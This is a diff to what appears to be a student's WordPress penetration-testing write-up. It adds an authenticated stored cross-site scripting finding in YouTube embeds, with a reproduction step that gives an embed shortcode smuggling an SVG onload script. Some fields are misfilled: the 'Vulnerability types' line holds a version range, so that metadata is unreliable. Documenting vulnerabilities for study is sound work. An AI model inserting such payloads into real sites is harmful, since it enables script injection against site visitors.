@@ -33,13 +33,17 @@ Time spent: **6** hours spent in total
 <hr>
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
+1.4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds CVE-2015-6535 
+    - Vulnerability types: 4.0-4.7.2
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.13
+  - [ ] GIF Walkthrough: ![video](https://user-images.githubusercontent.com/55426354/79059136-b2f14c80-7c44-11ea-92db-90ec9597cbcb.gif)
+  - [ ] Steps to recreate: Create a new post and embed a link
+ <ol>
+<li>Insert the malicious YouTube embed shortcode.</li>
+  <li>[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]</li>
+</ol>
+	
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Optional) Vulnerability Name or ID
